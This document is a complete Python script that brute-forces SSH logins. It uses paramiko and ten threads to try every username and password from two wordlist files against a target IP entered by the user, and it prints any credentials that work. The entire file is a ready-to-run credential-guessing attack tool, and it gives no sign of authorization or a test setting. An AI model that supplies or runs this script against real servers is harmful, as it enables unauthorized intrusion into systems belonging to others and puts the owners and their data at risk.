import paramiko
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

found_credentials = None
lock = Lock()

def try_ssh_login(host, port, username, password):
    global found_credentials

    if found_credentials:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"Trying: {username}@{host} with password: {password}")
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        with lock:
            if not found_credentials:
                found_credentials = (username, password)
        ssh.close()
    except paramiko.AuthenticationException as e:
        pass
    except paramiko.SSHException as e:
        print(f"SSH Error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssh.close()

def brute_ssh_combo(host, port, usernames, passwords):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(try_ssh_login, host, port, username, password))

        for f in as_completed(futures):
            if found_credentials:
                break

    if found_credentials:
        u, p = found_credentials
        print(f"\nCredentials found: {u}@{host} with password: {p}")
    else:
        print("\n No valid credentials found.")

host = input("Enter target IP: ").strip()
port = input("Enter port (default 22): ").strip()
port = int(port) if port else 22

with open("usernames.txt") as u_file:
    usernames = [line.strip() for line in u_file if line.strip()]

with open("passwords.txt") as p_file:
    passwords = [line.strip() for line in p_file if line.strip()]

brute_ssh_combo(host, port, usernames, passwords)
